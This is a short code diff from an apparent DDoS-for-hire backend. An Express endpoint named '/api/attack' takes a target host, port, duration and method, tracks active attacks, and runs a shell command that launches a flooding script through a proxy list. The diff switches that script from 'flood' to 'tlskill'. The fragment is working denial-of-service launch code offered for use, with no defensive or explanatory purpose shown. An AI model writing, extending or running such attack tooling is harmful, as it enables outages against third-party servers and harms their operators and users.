@@ -53,7 +53,7 @@ app.get("/api/attack", (req, res) => {
   activeAttacks++;
   res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
 
-  const command = `node flood ${host} ${time} 10 10 live.txt flood`;
+  const command = `node tlskill ${host} ${time} 10 10 live.txt flood`;
   executeAttack(command, clientIP);
 });
 
